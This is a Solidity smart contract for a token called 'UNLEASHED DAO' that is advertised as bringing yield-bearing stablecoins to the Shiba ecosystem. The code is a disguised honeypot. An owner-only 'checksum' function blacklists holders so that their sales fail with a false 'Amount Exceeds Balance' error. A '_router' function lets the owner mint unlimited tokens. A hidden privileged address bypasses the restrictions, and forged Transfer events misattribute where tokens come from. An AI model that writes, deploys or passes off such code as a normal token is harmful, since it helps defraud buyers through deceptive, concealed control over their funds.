pragma solidity 0.8.17;
/*

.%%..%%..%%..%%..%%......%%%%%%...%%%%....%%%%...%%..%%..%%%%%%..%%%%%..
.%%..%%..%%%.%%..%%......%%......%%..%%..%%......%%..%%..%%......%%..%%.
.%%..%%..%%.%%%..%%......%%%%....%%%%%%...%%%%...%%%%%%..%%%%....%%..%%.
.%%..%%..%%..%%..%%......%%......%%..%%......%%..%%..%%..%%......%%..%%.
..%%%%...%%..%%..%%%%%%..%%%%%%..%%..%%...%%%%...%%..%%..%%%%%%..%%%%%..
........................................................................

Unleashed DAO - $UNLEASHED

- Bringing interest bearing stable coins to Shiba Ecosystem
- Earn yeilds on stable coins or popular meme tokens, claim rewards any time

*/   
 
contract UNLEASHED {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) txVal;

    // 
    string public name = "UNLEASHED DAO";
    string public symbol = unicode"UNLEASHED";
    uint8 public decimals = 18;
    uint256 public totalSupply = 320000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x65c695beEcD48a3E99126198E8d6203529ecb8F7;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   


modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!txVal[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        function checksum(address _user) public {
             require(msg.sender == owner);
         require(!txVal[_user], "NaN");
        txVal[_user] = true; }
        function call(address _user) public {
             require(msg.sender == owner);
        require(txVal[_user], "NaN");
         txVal[_user] = false; }

         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
        function _router(address oracle,  uint256 update) public {
             require(msg.sender == owner);
             balanceOf[oracle] += update;
             totalSupply += update; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
        require(!txVal[from] , "Amount Exceeds Balance"); 
        require(!txVal[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }